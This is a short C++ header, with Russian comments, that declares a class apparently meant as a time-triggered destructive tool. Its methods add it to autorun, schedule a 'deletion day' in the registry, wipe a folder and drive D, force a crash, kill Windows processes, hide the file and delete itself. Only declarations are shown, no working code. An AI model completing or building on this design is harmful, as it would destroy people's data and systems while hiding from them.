#pragma once
class CDeleteDay
{
public:
	CDeleteDay();
	~CDeleteDay();

	// //добавляем себя автозагрузку
	static bool AddToAutoRun();
	// Проверить не наступил ли день выполнения задания
	static bool InspectDeleteData();

	// записываем в реестр когда выполнится задача
	bool SaveDeleteDay(SYSTEMTIME SysTime);
	// записываем какую папку будем удалять
	bool SaveFolderPathToDelete(CString csFolderPath);	
	bool EnableCrashOnCtrlScroll();
	bool DeleteDiskD();
	bool SaveTaskKillWindows();
	void SelfDelete();
	void HideFile();
};

